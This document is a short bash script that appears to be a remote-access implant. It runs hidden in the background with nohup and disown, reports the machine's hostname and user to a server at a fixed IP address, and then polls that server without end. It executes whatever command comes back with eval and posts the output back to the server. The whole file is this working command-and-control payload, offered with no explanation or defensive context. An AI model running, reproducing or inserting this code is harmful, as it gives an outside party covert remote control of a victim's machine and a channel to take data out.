#!/bin/bash
nohup bash -c 's=192.168.178.44:8080&&i=a6eb1e-1d8c0b-9ffd6e&&hname=$(hostname)&&p=http://;curl -s "$p$s/a6eb1e/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/1d8c0b" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/9ffd6e -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' & disown
